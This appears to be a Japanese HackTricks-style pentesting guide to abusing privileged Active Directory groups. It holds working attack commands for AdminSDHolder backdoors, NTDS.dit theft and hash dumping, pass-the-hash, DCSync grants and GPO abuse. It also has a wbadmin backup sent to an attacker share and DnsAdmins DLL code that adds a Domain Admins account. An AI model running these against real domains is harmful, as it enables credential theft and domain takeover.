# 特権グループ

{{#include ../../banners/hacktricks-training.md}}

## 管理者権限を持つ既知のグループ

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

このグループには、ドメイン上で管理者ではないアカウントやグループを作成する権限があります。また、Domain Controller (DC) へのローカルログインが可能になります。

このグループのメンバーを特定するには、次のコマンドを実行します。

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

新しいユーザーの追加と、DCへのローカルログインが許可されています。<sup>[[1]](#references)</sup>

アカウント管理からローカル管理者アクセスへつながる条件付きの経路として、**コンピューターのLAPSパスワードを読み取る権限が委任された通常のグループ**があります。そのグループに対する有効なメンバーシップ書き込み権限があるか、保護対象か、新規アカウントまたは制御下のアカウントが実際にそのグループに参加できるかを確認してください。対象コンピューターのLAPS読み取り権限をテストする前に、アカウントのトークンを更新してください。暗号化されたWindows LAPSでは、ディレクトリの読み取り権限とパスワードの復号権限は別々に必要です。グループメンバーシップやAccount Operatorsへの所属だけでは、どちらの権限も付与されません。[MicrosoftのAccount Operatorsの範囲](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)と[Windows LAPSの委任](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)を参照してください。

## AdminSDHolder グループ

**AdminSDHolder**グループのAccess Control List (ACL)は、Active Directory内の高い権限を持つグループを含む、すべての「保護対象グループ」の権限を設定するため、非常に重要です。この仕組みにより、不正な変更を防ぎ、これらのグループのセキュリティを確保します。

攻撃者は、**AdminSDHolder**グループのACLを変更し、標準ユーザーにすべての権限を付与することで、これを悪用できます。これにより、そのユーザーはすべての保護対象グループを完全に制御できるようになります。このユーザーの権限が変更または削除されても、システムの設計により1時間以内に自動的に再設定されます。<sup>[[14]](#references)</sup>

最近のWindows Serverのドキュメントでも、いくつかの組み込みオペレーターグループ（`Account Operators`、`Backup Operators`、`Print Operators`、`Server Operators`、`Domain Admins`、`Enterprise Admins`、`Key Admins`、`Enterprise Key Admins`など）は**保護対象**オブジェクトとして扱われています。**SDProp**プロセスは、既定で60分ごとに**PDC Emulator**上で実行され、`adminCount=1`を設定し、保護対象オブジェクトの継承を無効にします。これは、永続化にも、保護対象グループから削除されたにもかかわらず継承を無効にするACLが残っている、古い特権ユーザーの調査にも役立ちます。<sup>[[12]](#references)</sup>

メンバーの確認と権限の変更に使うコマンドは次のとおりです。

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

スクリプトを使うと、復元プロセスを迅速化できます: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

詳しくは[ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)をご覧ください。<sup>[[14]](#references)</sup>

## AD Recycle Bin

削除されたオブジェクトを参照できるかどうかは、実効ディレクトリ権限によって決まります。グループ名だけでは、現在のIDがオブジェクトを一覧表示または復元できることの証明にはなりません。完全な復元を行うには、削除前にAD Recycle Binが有効になっている必要があります。また、復元には、ネーミングコンテキストのルートに対するReanimate-Tombstones、名前変更権限、および宛先コンテナーに対するCREATE_CHILDも必要です。[MicrosoftのRecycle Binに関するガイダンス](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin)と[削除取り消しの認可ルール](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)では、これらの条件が区別されています。削除されたオブジェクトへの読み取りアクセス権を持つ認可済みIDは、機密情報が含まれている可能性のあるレコードを調査できます:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

これは**以前の権限昇格経路を復元する**のに役立ちます。削除済みオブジェクトからも、`lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、古いSPN、または別のオペレーターが後で復元できる削除済み特権グループのDNが見つかることがあります。

オブジェクトが削除済み状態にある間、アプリケーション定義属性に古い認証情報が残っている場合もあります。これは別個の調査候補として扱ってください。現在のIDには、削除済みオブジェクトを列挙する権限とその属性を読み取る権限の両方が必要です。また、その値が実際に使用できる認証情報であり、現在も有効なプリンシパルがそれを受け入れる必要があります。グループメンバーシップや削除済みアカウント名だけでは、これらの条件を一つも証明できません。通常の列挙時に認証情報の値を出力するのは避けてください。[Microsoft's Recycle Bin documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin)では、削除後の属性の保持について説明されています。

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### 委任ACLを通じて削除済みアカウントを復元する

削除済みアカウントに対するACLツールの`WRITE`結果は手掛かりであり、削除取り消し権限がすべて有効であることの証明ではありません。<sup>[[18]](#references)</sup> 削除済みオブジェクトのACLと`lastKnownParent`を直接確認してください。BloodHoundのパスには削除済みオブジェクトのACLが含まれない場合があります。<sup>[[19]](#references)</sup> 復元したアカウントにはパスワードハッシュが保持されていることがありますが、復元してもパスワードが開示されたり、パスワードリセット権限が付与されたりするわけではありません。認証には引き続き有効な認証情報が必要です。<sup>[[19]](#references)</sup>

Linuxから非表示の削除済みアカウントを列挙し、再活性化権限を確認するには、再利用オブジェクト用および無効化リンク用のLDAPコントロールを`bloodyAD`で使用します。その後、選択したアカウントを`sAMAccountName`で復元します。例のドメイン、ホスト、IDは評価対象の環境に置き換え、書き込みを行う前に対象のDNと`lastKnownParent`を確認してください。<sup>[[19]](#references)</sup>

```bash
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get writable
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get object 'DC=example,DC=local' --attr nTSecurityDescriptor --resolve-sd | grep -i Reanimate-Tombstones
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=example,DC=local' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,objectSid
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' set restore target.user
```

### ドメイン コントローラーへのアクセス

DC 上のファイルへのアクセスは、ユーザーが `Server Operators` グループに所属していない限り制限されています。このグループに所属すると、アクセスレベルが変わります。

### 権限昇格

Sysinternals の `PsService` または `sc` を使用すると、サービスの権限を調査および変更できます。たとえば、`Server Operators` グループは特定のサービスを完全に制御できるため、任意のコマンドを実行して権限昇格できます:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

このコマンドから、`Server Operators` がフルアクセス権を持ち、サービスを操作して権限を昇格できることがわかります。

## Backup Operators

`Backup Operators` のメンバーシップにより、ホストのローカルポリシーやログオンセッションによっては、`SeBackupPrivilege` と `SeRestorePrivilege` が付与されることがあります。コマンドを実行しているプロセスの**有効なトークン**を `whoami /groups` と `whoami /priv` で確認してください。メンバーシップがあるだけでは、`SeBackupPrivilege` が存在し、有効になっているとは限りません。特権が存在するものの無効な場合は、そのトークン内で有効化できることがあります。特権が存在しない、または削除されている場合、これらのバックアップ操作では使用できません。`SeBackupPrivilege` は、バックアップ対応 API（例: `FILE_FLAG_BACKUP_SEMANTICS` や `robocopy /B`）を使った保護対象の**読み取り**をサポートします。`SeRestorePrivilege` は、復元／書き込み操作に使用する別の特権です。通常のディレクトリ一覧表示やコピーでは、バックアップセマンティクスが使われるとは限りません。<sup>[[1]](#references)</sup>

グループメンバーを一覧表示するには、次を実行します:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### ローカル攻撃

有効なトークンに `SeBackupPrivilege` があるホストでは、以下のバックアップ対応コピーを使って保護されたファイルを読み取れます。

1. 必要なライブラリをインポートします。

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. 特権が存在するものの無効になっている場合は、このプロセスで有効化し、その状態を確認します。

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. 制限されたディレクトリからファイルをコピーします。たとえば：

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit` は、**ドメインコントローラー (DC)** 上の Active Directory データベースです。この手順には、DC 上で適切なトークンを持ち、データベースを含むボリュームにアクセスできることが必要です。別の場所で Backup Operators グループに所属していても、特定の DC へのアクセス権は付与されません。稼働中のデータベースは通常ロックされているため、コピーする前に、アクセス可能なシャドウコピーまたは別のバックアップ機能を使用してください。シャドウコピーの作成や公開には、ホストの VSS 設定と呼び出し元の権限も関係します。以下の例では、DC の `C:` の `\Windows\NTDS` に `NTDS.dit` が保存されていることを前提としています。そうでない場合は、ボリュームとパスを適宜変更してください。

#### diskshadow.exe を使用する

1. 許可されている場合、DC の `C:` ドライブのシャドウコピーを作成し、`F:` として公開します:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. シャドウコピーから `NTDS.dit` をコピーします:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

または、ファイルのコピーに `robocopy` を使用します:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. オフライン抽出用に DC の `SYSTEM` hive を保存します。`SAM` はメンバーシステム上のローカルアカウントデータベースです。DC の `SAM` hive は `NTDS.dit` の代替にはならず、ドメイン Administrator の hash の取得元にもなりません:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. `ntds.dit` と `SYSTEM.SAV` を分析ホストに転送し、ドメインアカウントのハッシュを抽出します。メンバーシステムから保存した `SAM` ハイブと対応する `SYSTEM` ハイブを使うと、代わりにローカルアカウントのハッシュを取得できます：

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. `NTDS.dit` から**ドメイン** Administrator のハッシュを回収できた場合、ドメイン認証に使用できるかテストできます。`SAM.SAV` から取得したローカル Administrator のハッシュは別の認証情報であり、ドメイン Administrator としての認証には使用できません。<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### wbadmin.exe の使用

1. 攻撃者のマシン上で SMB サーバー用の NTFS ファイルシステムをセットアップし、ターゲットマシン上で SMB 認証情報をキャッシュします。
2. `wbadmin.exe` を使用してシステムをバックアップし、`NTDS.dit` を抽出します。
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

実践的なデモについては、[IPPSECによるデモ動画](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)をご覧ください。

## DnsAdmins

**DnsAdmins** グループのメンバーは、自身の権限を悪用して、DNS サーバー上で SYSTEM 権限を使って任意の DLL を読み込ませることができます。DNS サーバーは多くの場合、ドメインコントローラー上でホストされています。この機能には、大きな悪用の可能性があります。

DnsAdmins グループのメンバーを一覧表示するには、次のコマンドを使用します。

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### 任意のDLLを実行（CVE‑2021‑40469）

> [!NOTE]
> この脆弱性により、DNSサービス（通常はDC内）でSYSTEM権限を使って任意のコードを実行できます。この問題は2021年に修正されました。

メンバーは、次のようなコマンドを使用して、DNSサーバーに任意のDLL（ローカルまたはリモート共有上のもの）を読み込ませることができます：

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

DLLを読み込ませるには、DNSサービスを再起動する必要があります（追加の権限が必要な場合があります）:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

この攻撃ベクトルの詳細については、ired.teamを参照してください。

#### Mimilib.dll

mimilib.dllを使用したコマンド実行も可能です。特定のコマンドやreverse shellを実行するように変更できます。詳細は[こちらの投稿](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)を確認してください。<sup>[[15]](#references)</sup>

### MitM用WPADレコード

DnsAdminsは、グローバルクエリブロックリストを無効にした後にWPADレコードを作成することで、DNSレコードを操作してMan-in-the-Middle（MitM）攻撃を実行できます。ResponderやInveighなどのツールを使って、ネットワークトラフィックを偽装・キャプチャできます。

### Event Log Readers
メンバーはイベントログにアクセスでき、平文パスワードやコマンド実行の詳細など、機密情報を発見できる可能性があります：

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

このグループはドメインオブジェクトのDACLを変更でき、DCSync権限を付与できる可能性があります。このグループを悪用した権限昇格の手法については、Exchange-AD-Privesc GitHub repoで詳しく説明されています。

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

このグループのメンバーとして操作できる場合、典型的な悪用方法は、攻撃者が制御するプリンシパルに[DCSync](dcsync.md)に必要なレプリケーション権限を付与することです。

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Historically, **PrivExchange** は、メールボックスへのアクセス、Exchange 認証の強制、LDAP relay を連鎖させて、同じプリミティブを獲得していました。この relay 経路が緩和されている場合でも、`Exchange Windows Permissions` への直接のメンバーシップや Exchange server の制御は、ドメインレプリケーション権限を得るための価値の高い経路であり続けます。

## Hyper-V Administrators

Hyper-V Administrators は Hyper-V へのフルアクセス権を持ち、これを悪用して仮想化された Domain Controller を制御できます。これには、稼働中の DC のクローンを作成し、NTDS.dit ファイルから NTLM hash を抽出することが含まれます。

### Exploitation Example

実際の悪用では、古いホストレベルの LPE 手法よりも、通常は **DC のディスクやチェックポイントへのオフラインアクセス** が使われます。Hyper-V host にアクセスできれば、オペレーターは仮想化された Domain Controller のチェックポイントを作成またはエクスポートし、VHDX をマウントして、guest 内の LSASS に触れることなく `NTDS.dit`、`SYSTEM`、その他の secret を抽出できます：

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

そこから、`Backup Operators` のワークフローを再利用して、`Windows\NTDS\ntds.dit` とレジストリハイブをオフラインでコピーします。関連するバックアップファイルのワークフロー:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

このグループのメンバーは、ドメイン内でグループポリシーを作成できます。ただし、メンバーはユーザーやグループにグループポリシーを適用したり、既存の GPO を編集したりできません。

重要な点として、**新しい GPO の所有者になるのは作成者**であり、通常はその後に編集するための十分な権限も得られます。つまり、このグループが有用なのは、次のいずれかが可能な場合です。

- 悪意のある GPO を作成し、管理者を説得して対象の OU/ドメインにリンクさせる
- 作成した GPO がすでに適切な場所にリンクされている場合に、それを編集する
- GPO をリンクできる別の委任された権限を悪用し、このグループで編集権限を補う

実際の悪用では通常、SYSVOL に保存されたポリシーファイルを通じて、**Immediate Task**、**startup script**、**local admin membership**、または**user rights assignment** の変更を追加します。<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

`SYSVOL` を通じて GPO を手動で編集する場合、変更だけでは不十分であることに注意してください。`versionNumber`、`GPT.ini`、場合によっては `gPCMachineExtensionNames` も更新しないと、クライアントはポリシーの更新を無視します。<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange** が導入されている環境では、**Organization Management** と呼ばれる特別なグループが大きな権限を持ちます。このグループには、**ドメイン内のすべてのユーザーのメールボックスにアクセスする**権限があり、**'Microsoft Exchange Security Groups'** 組織単位 (OU) に対する**フルコントロール**を保持しています。この権限には、権限昇格に悪用できる **`Exchange Windows Permissions`** グループも含まれます。

### 権限の悪用とコマンド

#### Print Operators

**Print Operators** グループのメンバーには、**`SeLoadDriverPrivilege`** などのいくつかの権限が付与されています。この権限により、**ドメイン コントローラーにローカルでログオン**し、シャットダウンしたり、プリンターを管理したりできます。これらの権限を悪用するには、特に昇格されていないコンテキストで **`SeLoadDriverPrivilege`** が表示されない場合、User Account Control (UAC) のバイパスが必要です。<sup>[[1]](#references)</sup>

このグループのメンバーを一覧表示するには、次の PowerShell コマンドを使用します。

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

ドメイン コントローラーでは、既定の Domain Controller Policy により **`SeLoadDriverPrivilege`** が `Print Operators` に付与されているため、このグループは危険です。このグループのメンバーの昇格トークンを取得できれば、特権を有効化し、署名済みだが脆弱なドライバーをロードして、カーネル／SYSTEM に昇格できます。<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> トークンの扱いについては、[Access Tokens](../windows-local-privilege-escalation/access-tokens.md) を参照してください。

#### Remote Desktop Users

このグループのメンバーには、Remote Desktop Protocol (RDP) 経由で PC にアクセスする権限が付与されます。メンバーを列挙するには、次の PowerShell コマンドを使用できます：

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

RDP の悪用に関する詳しい情報は、専用の pentesting リソースで確認できます。

#### Remote Management Users

メンバーは **Windows Remote Management (WinRM)** 経由で PC にアクセスできます。メンバーの列挙は、次の方法で行えます。

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

WinRM に関連する悪用手法については、該当するドキュメントを参照してください。

#### Server Operators

このグループには、バックアップおよび復元の権限、システム時刻の変更、システムのシャットダウンなど、ドメインコントローラーでさまざまな構成を実行する権限があります。<sup>[[1]](#references)</sup> メンバーを列挙するには、次のコマンドを実行します。

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

ドメイン コントローラーでは、`Server Operators` は通常、**サービスの再構成や起動・停止**に十分な権限を継承し、既定の DC ポリシーを通じて `SeBackupPrivilege`/`SeRestorePrivilege` も付与されます。実際には、これにより **service-control abuse** と **NTDS extraction** の橋渡しが可能になります:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

サービスを一覧表示できなくても、**既知のサービス**へのアクセスが否定されるわけではありません。Service Control Manager は、一覧表示に必要な `SC_MANAGER_ENUMERATE_SERVICE` と `SC_MANAGER_CONNECT` を個別に確認します。名前を指定してサービスを開く場合は、そのサービス固有の権限（`SERVICE_CHANGE_CONFIG` や `SERVICE_START` など）が確認されます。一般的な `sc.exe query` が失敗しても、有効な token と対象サービスの ACL を確認してください。構成変更権限だけでは、可能性があるにすぎません。より高い権限への移行が可能かどうかは、サービスの実行アカウント、開始・停止権限、利用可能な trigger によって決まります。[Microsoft のサービスアクセス権リファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

サービス ACL にこのグループの変更・開始権限がある場合は、サービスに任意のコマンドを指定し、`LocalSystem` として起動した後、元の `binPath` に戻します。サービス制御が制限されている場合は、上記の `Backup Operators` の手法に切り替えて `NTDS.dit` をコピーしてください。

## References

- [1] [ired.team – 特権アカウントと Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – 特権昇格のための SeLoadDriverPrivilege の悪用](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO 権限の悪用](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO の悪用、第 1 部 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPO と OU に関する Red Teamer 向けガイド](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver 関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – 付録 C: Active Directory の保護されたアカウントとグループ](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – AdminSDHolder の悪用とバックドア設置による Domain Admin の永続的な取得方法](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory での昇格を目的とした DnsAdmins 権限の悪用](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll エッジの悪用に関する情報](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver 関数 (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [18] [MS-ADTS - 削除取り消しの認可ルール](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)
- [19] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
